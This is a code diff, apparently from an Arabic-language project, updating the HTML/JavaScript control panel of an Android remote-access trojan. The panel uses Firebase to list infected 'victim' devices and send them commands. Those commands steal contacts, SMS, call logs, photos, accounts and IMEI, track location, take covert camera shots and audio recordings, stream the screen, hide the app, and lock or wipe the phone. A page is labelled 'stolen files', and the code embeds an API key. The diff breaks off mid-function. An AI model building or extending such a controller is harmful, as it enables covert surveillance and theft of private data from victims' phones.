@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>💀 بلاك الشيطان - C2</title>
+    <title>بلاك 👿</title>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
     <style>
@@ -26,19 +26,22 @@
         @keyframes fadeIn{from{opacity:0}to{opacity:1}}
         .header{background:linear-gradient(135deg,#0a0000,#1a0000);padding:15px;text-align:center;border-bottom:2px solid #ff0000;position:sticky;top:0;z-index:100}
         .header h1{color:#ff0000;font-size:22px;text-shadow:0 0 30px #ff0000;letter-spacing:4px}
-        .page{display:none;padding:15px}
+        .page{display:none;padding:15px;animation:fadeIn 0.3s}
         .page.active{display:block}
         .bottom-nav{position:fixed;bottom:0;left:0;width:100%;background:#1a0000;display:flex;justify-content:space-around;padding:8px 0;border-top:2px solid #330000;z-index:999}
         .nav-item{text-align:center;color:#660000;font-size:10px;cursor:pointer;padding:5px 10px}
         .nav-item.active{color:#ff0000;text-shadow:0 0 20px #ff0000}
         .nav-item .icon{font-size:22px;display:block}
         .cmd-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
-        .cmd-btn{padding:12px;background:#1a0000;border:1px solid #330000;border-radius:12px;text-align:center;cursor:pointer}
+        .cmd-btn{padding:12px;background:#1a0000;border:1px solid #330000;border-radius:12px;text-align:center;cursor:pointer;transition:0.3s}
         .cmd-btn:hover{border-color:#ff0000;box-shadow:0 0 30px rgba(255,0,0,0.2)}
         .cmd-btn .icon{font-size:26px;display:block}
         .cmd-btn .label{font-size:10px;color:#aaa}
         .btn-danger{background:#ff0000;color:#000;border:none;padding:12px;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;width:100%;margin-top:10px}
+        .btn-danger:hover{box-shadow:0 0 40px rgba(255,0,0,0.3)}
         .btn-secondary{background:#330000;color:#fff;border:none;padding:12px;border-radius:10px;font-size:16px;cursor:pointer;width:100%;margin-top:10px}
+        .btn-success{background:#00aa00;color:#fff;border:none;padding:12px;border-radius:10px;font-size:16px;cursor:pointer;width:100%;margin-top:10px}
+        .btn-success:hover{box-shadow:0 0 40px rgba(0,255,0,0.3)}
         .device-item{background:#0a0000;border:1px solid #330000;border-radius:10px;padding:12px;margin-bottom:8px;cursor:pointer}
         .device-item:hover{border-color:#ff0000}
         .device-item .name{color:#fff;font-size:14px}
@@ -49,69 +52,51 @@
         .input-field:focus{border-color:#ff0000;outline:none}
         .stream-container{background:#0a0000;border:2px solid #330000;border-radius:15px;padding:15px;min-height:300px;display:flex;align-items:center;justify-content:center;color:#666;flex-direction:column}
         .stream-container.active{background:#001a00;border-color:#00ff00}
+        .back-btn{background:#660000;color:#fff;border:none;padding:10px;border-radius:8px;font-size:14px;cursor:pointer;width:100%;margin-bottom:10px}
+        .back-btn:hover{background:#990000}
+        .option-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin:10px 0}
+        .option-btn{padding:15px;background:#1a0000;border:2px solid #330000;border-radius:12px;text-align:center;cursor:pointer;font-size:14px;color:#fff;transition:0.3s}
+        .option-btn:hover{border-color:#ff0000;box-shadow:0 0 30px rgba(255,0,0,0.2)}
+        .option-btn.selected{border-color:#00ff00;background:#001a00}
+        .status-msg{background:#001a00;border:1px solid #00ff00;border-radius:10px;padding:15px;margin:10px 0;text-align:center;color:#00ff00;font-size:14px}
+        .status-msg.error{background:#1a0000;border-color:#ff0000;color:#ff0000}
+        .hidden{display:none}
     </style>
 </head>
 <body>
+
+    <!-- ====== شاشة التحميل ====== -->
     <div id="splash">
-        <span class="skull">💀</span>
+        <span class="skull">👿</span>
         <div class="ring"></div>
         <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
         <div class="percent" id="percent">0%</div>
         <div class="splash-text" id="splashText"></div>
-        <div class="sub">/// بلاك الشيطان ///</div>
+        <div class="sub">/// بلاك 👿 ///</div>
     </div>
 
+    <!-- ====== التطبيق الرئيسي ====== -->
     <div id="app">
-        <div class="header"><h1>💀 بلاك الشيطان</h1></div>
+        <div class="header">
+            <h1>👿 بلاك</h1>
+            <div class="sub" style="color:#660000;font-size:11px;letter-spacing:2px;">/// نظام التحكم المتقدم ///</div>
+        </div>
 
+        <!-- الصفحة الرئيسية -->
         <div id="page-home" class="page active">
             <h3 style="color:#ff0000;margin-bottom:10px;">📱 الأجهزة المتصلة</h3>
             <div id="deviceList"></div>
         </div>
 
+        <!-- صفحة الأوامر -->
         <div id="page-commands" class="page">
             <h3 style="color:#ff0000;margin-bottom:10px;">⚡ الأوامر</h3>
-            <div class="cmd-grid">
-                <div class="cmd-btn" onclick="execCmd('get_contacts')"><span class="icon">📇</span><span class="label">جهات الاتصال</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_sms')"><span class="icon">💬</span><span class="label">الرسائل</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_calllogs')"><span class="icon">📞</span><span class="label">سجل المكالمات</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_location')"><span class="icon">📍</span><span class="label">الموقع</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_device')"><span class="icon">📱</span><span class="label">معلومات الجهاز</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_photos')"><span class="icon">🖼</span><span class="label">الصور</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_videos')"><span class="icon">🎬</span><span class="label">الفيديوهات</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_apps')"><span class="icon">📦</span><span class="label">التطبيقات</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_clipboard')"><span class="icon">📋</span><span class="label">الحافظة</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_accounts')"><span class="icon">👤</span><span class="label">الحسابات</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_imei')"><span class="icon">📟</span><span class="label">IMEI</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_phone')"><span class="icon">📞</span><span class="label">رقم الهاتف</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_sim')"><span class="icon">📡</span><span class="label">معلومات SIM</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_wifi')"><span class="icon">📶</span><span class="label">الواي فاي</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_battery')"><span class="icon">🔋</span><span class="label">البطارية</span></div>
-                <div class="cmd-btn" onclick="execCmd('get_ip')"><span class="icon">🌐</span><span class="label">IP العام</span></div>
-                <div class="cmd-btn" onclick="execCmd('toggle_wifi_on')"><span class="icon">📶</span><span class="label">تشغيل الواي فاي</span></div>
-                <div class="cmd-btn" onclick="execCmd('toggle_wifi_off')"><span class="icon">📶</span><span class="label">إيقاف الواي فاي</span></div>
-                <div class="cmd-btn" onclick="execCmd('toggle_bluetooth_on')"><span class="icon">📶</span><span class="label">تشغيل البلوتوث</span></div>
-                <div class="cmd-btn" onclick="execCmd('toggle_bluetooth_off')"><span class="icon">📶</span><span class="label">إيقاف البلوتوث</span></div>
-                <div class="cmd-btn" onclick="execCmd('vibrate')"><span class="icon">📳</span><span class="label">اهتزاز</span></div>
-                <div class="cmd-btn" onclick="execCmd('set_volume_max')"><span class="icon">🔊</span><span class="label">رفع الصوت</span></div>
-                <div class="cmd-btn" onclick="execCmd('set_volume_min')"><span class="icon">🔇</span><span class="label">خفض الصوت</span></div>
-                <div class="cmd-btn" onclick="execCmd('open_browser')"><span class="icon">🌐</span><span class="label">فتح متصفح</span></div>
-                <div class="cmd-btn" onclick="execCmd('hide_app')"><span class="icon">👁‍🗨</span><span class="label">إخفاء التطبيق</span></div>
-                <div class="cmd-btn" onclick="execCmd('show_app')"><span class="icon">👁</span><span class="label">إظهار التطبيق</span></div>
-                <div class="cmd-btn" onclick="execCmd('fake_notif')"><span class="icon">🔔</span><span class="label">إشعار وهمي</span></div>
-                <div class="cmd-btn" onclick="execCmd('lock_device')"><span class="icon">🔒</span><span class="label">قفل الجهاز</span></div>
-                <div class="cmd-btn" onclick="execCmd('take_photo')"><span class="icon">📸</span><span class="label">تصوير خلفي</span></div>
-                <div class="cmd-btn" onclick="execCmd('take_photo_front')"><span class="icon">🤳</span><span class="label">تصوير أمامي</span></div>
-                <div class="cmd-btn" onclick="execCmd('flash_on')"><span class="icon">🔦</span><span class="label">فلاش تشغيل</span></div>
-                <div class="cmd-btn" onclick="execCmd('flash_off')"><span class="icon">🔦</span><span class="label">فلاش إيقاف</span></div>
-                <div class="cmd-btn" onclick="execCmd('start_record')"><span class="icon">🎙</span><span class="label">تسجيل صوت</span></div>
-                <div class="cmd-btn" onclick="execCmd('stop_record')"><span class="icon">⏹</span><span class="label">إيقاف التسجيل</span></div>
-                <div class="cmd-btn" onclick="execCmd('screenshot')"><span class="icon">📷</span><span class="label">لقطة شاشة</span></div>
-                <div class="cmd-btn" onclick="execCmd('reboot')"><span class="icon">🔄</span><span class="label">إعادة تشغيل</span></div>
-                <div class="cmd-btn" onclick="execCmd('shutdown')"><span class="icon">⏻</span><span class="label">إيقاف تشغيل</span></div>
+            <div class="cmd-grid" id="cmdGrid">
+                <!-- يتم توليدها بواسطة JavaScript -->
             </div>
         </div>
 
+        <!-- صفحة بث الشاشة -->
         <div id="page-stream" class="page">
             <h3 style="color:#ff0000;margin-bottom:10px;">📡 بث الشاشة</h3>
             <div class="stream-container" id="streamContainer"><span style="color:#660000;">⏳ انتظر بدء البث...</span></div>
@@ -119,11 +104,13 @@
             <button class="btn-secondary" onclick="stopStream()">⏹ إيقاف البث</button>
         </div>
 
+        <!-- صفحة الملفات -->
         <div id="page-files" class="page">
             <h3 style="color:#ff0000;margin-bottom:10px;">📂 الملفات المسروقة</h3>
             <div id="fileList"><div style="color:#660000;text-align:center;">📭 لا توجد ملفات</div></div>
         </div>
 
+        <!-- صفحة الإعدادات -->
         <div id="page-settings" class="page">
             <h3 style="color:#ff0000;margin-bottom:10px;">⚙️ الإعدادات</h3>
             <input class="input-field" id="apiKey" placeholder="مفتاح API" value="AIzaSyDBizqAKWSwGsicO6eRua-5x_8VQLFKTIc">
@@ -132,6 +119,13 @@
             <button class="btn-secondary" onclick="toggleHide()">👁️ إخفاء/إظهار التطبيق (الضحية)</button>
         </div>
 
+        <!-- ====== الصفحات الفرعية (لكل أمر) ====== -->
+        <div id="subpage" class="page">
+            <button class="back-btn" onclick="closeSubPage()">🔙 رجوع</button>
+            <div id="subpageContent"></div>
+        </div>
+
+        <!-- شريط التنقل السفلي -->
         <div class="bottom-nav">
             <div class="nav-item active" onclick="showPage('page-home', this)"><span class="icon">🏠</span>الرئيسية</div>
             <div class="nav-item" onclick="showPage('page-commands', this)"><span class="icon">⚡</span>الأوامر</div>
@@ -142,7 +136,7 @@
     </div>
 
     <script>
-        // شاشة التحميل
+        // ===== شاشة التحميل =====
         let progress = 0;
         const text = "تم الفتح";
         const letters = text.split('');
@@ -173,8 +167,9 @@
             if (progress >= 100) clearInterval(interval);
         }, 150);
 
-        // Firebase
+        // ===== Firebase =====
         let selectedDevice = null;
+        let selectedDeviceName = '';
         let devices = {};
         let database = null;
         let commandsRef = null;
@@ -219,6 +214,7 @@
                     const data = snapshot.val();
                     if (data) updateFiles(data);
                 });
+                generateCommands();
                 alert('✅ تم الاتصال بـ Firebase');
             } catch(e) { alert('❌ خطأ: ' + e.message); }
         }
@@ -238,7 +234,8 @@
                 div.innerHTML = `<div class="name">📱 ${dev.device_name}</div><div class="version">🤖 ${dev.android || 'غير معروف'}</div>`;
                 div.onclick = () => {
                     selectedDevice = id;
-                    alert('✅ تم اختيار: ' + dev.device_name);
+                    selectedDeviceName = dev.device_name || 'الجهاز';
+                    alert('✅ تم اختيار: ' + selectedDeviceName);
                     if (dataListener) {
                         database.ref('devices').child(id).child('data').off('value', dataListener);
                     }
@@ -283,7 +280,7 @@
             if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
             if (!commandsRef) return alert('⚠️ Firebase غير متصل');
             commandsRef.child(selectedDevice).set(cmd);
-            alert('📤 تم إرسال الأمر: ' + cmd);
+            showStatus('📤 تم إرسال الأمر: ' + cmd + ' إلى ' + selectedDeviceName);
         }
 
         function startStream() {
@@ -292,6 +289,7 @@
             container.innerHTML = '<span style="color:#00ff00;">🟢 جاري طلب الموافقة على البث...</span>';
             container.classList.add('active');
             commandsRef.child(selectedDevice).set('start_stream');
+            showStatus('📡 بدء البث على ' + selectedDeviceName);
         }
 
         function stopStream() {
@@ -300,13 +298,14 @@
             container.innerHTML = '<span style="color:#660000;">⏹ تم إيقاف البث</span>';
             container.classList.remove('active');
             commandsRef.child(selectedDevice).set('stop_stream');
+            showStatus('⏹ تم إيقاف البث');
         }
 
         function toggleHide() {
             if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
-            const action = confirm('إخفاء التطبيق؟') ? 'hide_app' : 'show_app';
+            const action = confirm('إخفاء التطبيق على ' + selectedDeviceName + '؟') ? 'hide_app' : 'show_app';
             commandsRef.child(selectedDevice).set(action);
-            alert('✅ تم إرسال الأمر: ' + action);
+            showStatus('✅ تم إرسال الأمر: ' + action);
         }
 
         function saveSettings() {
@@ -317,6 +316,316 @@
             alert('✅ تم حفظ الإعدادات');
             initFirebase();
         }
+
+        // ===== نظام الصفحات الفرعية =====
+        let currentSubPage = '';
+
+        function openSubPage(title, html) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('subpage').classList.add('active');
+            document.getElementById('subpageContent').innerHTML = `<h3 style="color:#ff0000;margin-bottom:15px;">${title}</h3>${html}`;
+            currentSubPage = title;
+        }
+
+        function closeSubPage() {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('page-commands').classList.add('active');
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            document.querySelectorAll('.nav-item')[1].classList.add('active');
+        }
+
+        function showStatus(msg) {
+            const statusDiv = document.getElementById('statusMsg');
+            if (statusDiv) {
+                statusDiv.innerHTML = msg;
+                statusDiv.className = 'status-msg';
+            }
+        }
+
+        function showError(msg) {
+            const statusDiv = document.getElementById('statusMsg');
+            if (statusDiv) {
+                statusDiv.innerHTML = '❌ ' + msg;
+                statusDiv.className = 'status-msg error';
+            }
+        }
+
+        // ===== توليد الأوامر مع صفحات فرعية =====
+        function generateCommands() {
+            const commands = [
+                { id: 'get_contacts', icon: '📇', label: 'جهات الاتصال', desc: 'جلب جميع جهات الاتصال' },
+                { id: 'get_sms', icon: '💬', label: 'الرسائل', desc: 'جلب جميع الرسائل النصية' },
+                { id: 'get_calllogs', icon: '📞', label: 'سجل المكالمات', desc: 'جلب سجل المكالمات' },
+                { id: 'get_location', icon: '📍', label: 'الموقع', desc: 'الحصول على الموقع الحالي' },
+                { id: 'get_device', icon: '📱', label: 'معلومات الجهاز', desc: 'عرض معلومات الجهاز' },
+                { id: 'get_photos', icon: '🖼', label: 'الصور', desc: 'سحب الصور' },
+                { id: 'get_videos', icon: '🎬', label: 'الفيديوهات', desc: 'سحب الفيديوهات' },
+                { id: 'get_apps', icon: '📦', label: 'التطبيقات', desc: 'قائمة التطبيقات' },
+                { id: 'get_clipboard', icon: '📋', label: 'الحافظة', desc: 'جلب محتوى الحافظة' },
+                { id: 'get_accounts', icon: '👤', label: 'الحسابات', desc: 'جلب الحسابات المسجلة' },
+                { id: 'get_imei', icon: '📟', label: 'IMEI', desc: 'جلب رقم IMEI' },
+                { id: 'get_phone', icon: '📞', label: 'رقم الهاتف', desc: 'جلب رقم الهاتف' },
+                { id: 'get_sim', icon: '📡', label: 'معلومات SIM', desc: 'جلب معلومات SIM' },
+                { id: 'get_wifi', icon: '📶', label: 'الواي فاي', desc: 'جلب معلومات الواي فاي' },
+                { id: 'get_battery', icon: '🔋', label: 'البطارية', desc: 'جلب مستوى البطارية' },
+                { id: 'get_ip', icon: '🌐', label: 'IP العام', desc: 'جلب IP العام' },
+                { id: 'toggle_wifi_on', icon: '📶', label: 'تشغيل الواي فاي', desc: 'تشغيل الواي فاي' },
+                { id: 'toggle_wifi_off', icon: '📶', label: 'إيقاف الواي فاي', desc: 'إيقاف الواي فاي' },
+                { id: 'toggle_bluetooth_on', icon: '📶', label: 'تشغيل البلوتوث', desc: 'تشغيل البلوتوث' },
+                { id: 'toggle_bluetooth_off', icon: '📶', label: 'إيقاف البلوتوث', desc: 'إيقاف البلوتوث' },
+                { id: 'toggle_location_on', icon: '📍', label: 'تشغيل الموقع', desc: 'تشغيل الموقع' },
+                { id: 'toggle_location_off', icon: '📍', label: 'إيقاف الموقع', desc: 'إيقاف الموقع' },
+                { id: 'vibrate', icon: '📳', label: 'اهتزاز', desc: 'تشغيل الاهتزاز' },
+                { id: 'set_volume_max', icon: '🔊', label: 'رفع الصوت', desc: 'رفع الصوت للأعلى' },
+                { id: 'set_volume_min', icon: '🔇', label: 'خفض الصوت', desc: 'خفض الصوت للأدنى' },
+                { id: 'open_browser', icon: '🌐', label: 'فتح متصفح', desc: 'فتح المتصفح' },
+                { id: 'hide_app', icon: '👁‍🗨', label: 'إخفاء التطبيق', desc: 'إخفاء التطبيق عن الضحية' },
+                { id: 'show_app', icon: '👁', label: 'إظهار التطبيق', desc: 'إظهار التطبيق للضحية' },
+                { id: 'fake_notif', icon: '🔔', label: 'إشعار وهمي', desc: 'إرسال إشعار وهمي' },
+                { id: 'lock_device', icon: '🔒', label: 'قفل الجهاز', desc: 'قفل جهاز الضحية' },
+                { id: 'take_photo', icon: '📸', label: 'تصوير خلفي', desc: 'التقاط صورة بالكاميرا الخلفية' },
+                { id: 'take_photo_front', icon: '🤳', label: 'تصوير أمامي', desc: 'التقاط صورة بالكاميرا الأمامية' },
+                { id: 'flash_on', icon: '🔦', label: 'فلاش تشغيل', desc: 'تشغيل الفلاش' },
+                { id: 'flash_off', icon: '🔦', label: 'فلاش إيقاف', desc: 'إيقاف الفلاش' },
+                { id: 'start_record', icon: '🎙', label: 'تسجيل صوت', desc: 'بدء تسجيل الصوت' },
+                { id: 'stop_record', icon: '⏹', label: 'إيقاف التسجيل', desc: 'إيقاف تسجيل الصوت' },
+                { id: 'screenshot', icon: '📷', label: 'لقطة شاشة', desc: 'التقاط لقطة شاشة' },
+                { id: 'reboot', icon: '🔄', label: 'إعادة تشغيل', desc: 'إعادة تشغيل الجهاز' },
+                { id: 'shutdown', icon: '⏻', label: 'إيقاف تشغيل', desc: 'إيقاف تشغيل الجهاز' },
+                { id: 'clear_data', icon: '🧹', label: 'مسح البيانات', desc: 'مسح بيانات التطبيقات' },
+                { id: 'kill_apps', icon: '🗑️', label: 'إيقاف التطبيقات', desc: 'إيقاف جميع التطبيقات الجارية' }
+            ];
+
+            const grid = document.getElementById('cmdGrid');
+            grid.innerHTML = '';
+            commands.forEach(cmd => {
+                const div = document.createElement('div');
+                div.className = 'cmd-btn';
+                div.innerHTML = `<span class="icon">${cmd.icon}</span><span class="label">${cmd.label}</span>`;
+                div.onclick = () => openCommandPage(cmd);
+                grid.appendChild(div);
+            });
+        }
+
+        // ===== فتح صفحة الأمر =====
+        function openCommandPage(cmd) {
+            let html = `<p style="color:#aaa;margin-bottom:15px;">${cmd.desc}</p>`;
+            html += `<div id="statusMsg" class="status-msg" style="display:none;"></div>`;
+
+            // أوامر خاصة
+            if (cmd.id === 'get_photos') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithCount('get_photos_5',5)">📸 5 صور</div>
+                        <div class="option-btn" onclick="execCmdWithCount('get_photos_10',10)">📸 10 صور</div>
+                        <div class="option-btn" onclick="execCmdWithCount('get_photos_20',20)">📸 20 صورة</div>
+                        <div class="option-btn" onclick="execCmdWithCount('get_photos_30',30)">📸 30 صورة</div>
+                        <div class="option-btn" onclick="execCmdWithCount('get_photos',0)">📸 جميع الصور</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'get_videos') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithCount('get_videos_5',5)">🎬 5 فيديوهات</div>
+                        <div class="option-btn" onclick="execCmdWithCount('get_videos_10',10)">🎬 10 فيديوهات</div>
+                        <div class="option-btn" onclick="execCmdWithCount('get_videos',0)">🎬 جميع الفيديوهات</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'get_contacts') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('get_contacts','📇 جلب جهات الاتصال')">📇 جلب الجهات</div>
+                        <div class="option-btn" onclick="execCmdWithAction('copy_contacts','📋 نسخ الجهات')">📋 نسخ الجهات</div>
+                        <div class="option-btn" onclick="execCmdWithAction('export_contacts','📤 تصدير الجهات')">📤 تصدير الجهات</div>
+                    </div>
+                    <div style="margin-top:10px;">
+                        <button class="btn-success" onclick="execCmdWithAction('add_contact','➕ إضافة جهة اتصال')">➕ إضافة جهة اتصال</button>
+                        <button class="btn-danger" onclick="execCmdWithAction('delete_contact','🗑️ حذف جهة اتصال')">🗑️ حذف جهة اتصال</button>
+                    </div>
+                `;
+            } else if (cmd.id === 'get_sms') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('get_sms','💬 جلب الرسائل')">💬 جلب الرسائل</div>
+                        <div class="option-btn" onclick="execCmdWithAction('forward_sms','↪️ إعادة توجيه الرسائل')">↪️ إعادة توجيه</div>
+                    </div>
+                    <div style="margin-top:10px;">
+                        <button class="btn-success" onclick="execCmdWithAction('send_sms','📤 إرسال رسالة')">📤 إرسال رسالة</button>
+                        <button class="btn-danger" onclick="execCmdWithAction('delete_sms','🗑️ حذف رسالة')">🗑️ حذف رسالة</button>
+                    </div>
+                `;
+            } else if (cmd.id === 'get_calllogs') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('get_calllogs','📞 جلب سجل المكالمات')">📞 جلب السجل</div>
+                        <div class="option-btn" onclick="execCmdWithAction('call_history','📋 سجل المكالمات')">📋 عرض السجل</div>
+                    </div>
+                    <div style="margin-top:10px;">
+                        <button class="btn-success" onclick="execCmdWithAction('make_call','📞 إجراء مكالمة')">📞 إجراء مكالمة</button>
+                        <button class="btn-danger" onclick="execCmdWithAction('end_call','⏹ إنهاء المكالمة')">⏹ إنهاء المكالمة</button>
+                    </div>
+                `;
+            } else if (cmd.id === 'toggle_wifi_on' || cmd.id === 'toggle_wifi_off') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('toggle_wifi_on','📶 تشغيل الواي فاي')">📶 تشغيل</div>
+                        <div class="option-btn" onclick="execCmdWithAction('toggle_wifi_off','📶 إيقاف الواي فاي')">📶 إيقاف</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'toggle_bluetooth_on' || cmd.id === 'toggle_bluetooth_off') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('toggle_bluetooth_on','📶 تشغيل البلوتوث')">📶 تشغيل</div>
+                        <div class="option-btn" onclick="execCmdWithAction('toggle_bluetooth_off','📶 إيقاف البلوتوث')">📶 إيقاف</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'toggle_location_on' || cmd.id === 'toggle_location_off') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('toggle_location_on','📍 تشغيل الموقع')">📍 تشغيل</div>
+                        <div class="option-btn" onclick="execCmdWithAction('toggle_location_off','📍 إيقاف الموقع')">📍 إيقاف</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'flash_on' || cmd.id === 'flash_off') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('flash_on','🔦 تشغيل الفلاش')">🔦 تشغيل</div>
+                        <div class="option-btn" onclick="execCmdWithAction('flash_off','🔦 إيقاف الفلاش')">🔦 إيقاف</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'take_photo' || cmd.id === 'take_photo_front') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('take_photo','📸 تصوير خلفي')">📸 خلفي</div>
+                        <div class="option-btn" onclick="execCmdWithAction('take_photo_front','🤳 تصوير أمامي')">🤳 أمامي</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'start_record' || cmd.id === 'stop_record') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('start_record','🎙 بدء التسجيل')">🎙 بدء</div>
+                        <div class="option-btn" onclick="execCmdWithAction('stop_record','⏹ إيقاف التسجيل')">⏹ إيقاف</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'hide_app' || cmd.id === 'show_app') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('hide_app','👁‍🗨 إخفاء التطبيق')">👁‍🗨 إخفاء</div>
+                        <div class="option-btn" onclick="execCmdWithAction('show_app','👁 إظهار التطبيق')">👁 إظهار</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'set_volume_max' || cmd.id === 'set_volume_min') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('set_volume_max','🔊 رفع الصوت')">🔊 رفع</div>
+                        <div class="option-btn" onclick="execCmdWithAction('set_volume_min','🔇 خفض الصوت')">🔇 خفض</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'reboot' || cmd.id === 'shutdown') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="if(confirm('⚠️ تأكيد إعادة التشغيل؟')) execCmdWithAction('reboot','🔄 إعادة تشغيل')">🔄 إعادة تشغيل</div>
+                        <div class="option-btn" onclick="if(confirm('⚠️ تأكيد إيقاف التشغيل؟')) execCmdWithAction('shutdown','⏻ إيقاف تشغيل')">⏻ إيقاف تشغيل</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'lock_device') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="if(confirm('🔒 تأكيد قفل الجهاز؟')) execCmdWithAction('lock_device','🔒 قفل الجهاز')">🔒 قفل الجهاز</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'clear_data') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="if(confirm('🧹 تأكيد مسح البيانات؟')) execCmdWithAction('clear_data','🧹 مسح البيانات')">🧹 مسح البيانات</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'kill_apps') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="if(confirm('🗑️ تأكيد إيقاف جميع التطبيقات؟')) execCmdWithAction('kill_apps','🗑️ إيقاف التطبيقات')">🗑️ إيقاف الكل</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'vibrate') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('vibrate','📳 اهتزاز')">📳 اهتزاز</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'open_browser') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('open_browser','🌐 فتح متصفح')">🌐 فتح متصفح</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'fake_notif') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('fake_notif','🔔 إشعار وهمي')">🔔 إشعار وهمي</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'get_location') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('get_location','📍 جلب الموقع')">📍 جلب الموقع</div>
+                        <div class="option-btn" onclick="execCmdWithAction('start_location_track','🔄 تتبع الموقع')">🔄 تتبع الموقع</div>
+                        <div class="option-btn" onclick="execCmdWithAction('stop_location_track','⏹ إيقاف التتبع')">⏹ إيقاف التتبع</div>
+                    </div>
+                `;
+            } else if (cmd.id === 'screenshot') {
+                html += `
+                    <div class="option-grid">
+                        <div class="option-btn" onclick="execCmdWithAction('screenshot','📷 لقطة شاشة')">📷 لقطة شاشة</div>
+                    </div>
+                `;
+            } else {
+                // أمر عادي
+                html += `
+                    <button class="btn-danger" onclick="execCmdWithAction('${cmd.id}','${cmd.icon} تنفيذ ${cmd.label}')">${cmd.icon} تنفيذ ${cmd.label}</button>
+                `;
+            }
+
+            // زر إرسال إلى البوت
+            html += `
+                <div style="margin-top:15px;border-top:1px solid #330000;padding-top:15px;">
+                    <button class="btn-success" onclick="sendToBot()">🤖 إرسال النتيجة إلى البوت</button>
+                    <button class="btn-secondary" onclick="closeSubPage()">🔙 خروج</button>
+                </div>
+            `;
+
+            openSubPage(`${cmd.icon} ${cmd.label}`, html);
+        }
+
+        function execCmdWithCount(cmd, count) {
+            if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
+            if (!commandsRef) return alert('⚠️ Firebase غير متصل');
+            commandsRef.child(selectedDevice).set(cmd);
+            showStatus(`📤 تم إرسال الأمر: ${cmd} (${count} ملف) إلى ${selectedDeviceName}`);
+            setTimeout(() => {
+                showStatus(`✅ تم تنفيذ الأمر بنجاح! سيتم إرسال ${count} ملف إلى Firebase`);
+            }, 2000);
+        }
+
+        function execCmdWithAction(cmd, action) {
+            if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
+            if (!commandsRef) return alert('⚠️ Firebase غير متصل');
+            commandsRef.child(selectedDevice).set(cmd);
+            showStatus(`📤 ${action} على ${selectedDeviceName}`);
+            setTimeout(() => {
+                showStatus(`✅ تم تنفيذ الأمر بنجاح!`);
+            }, 2000);
+        }
+
+        function sendToBot() {
+            if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
+            showStatus(`🤖 جاري إرسال النتيجة إلى البوت...`);
+            setTimeout(() => {
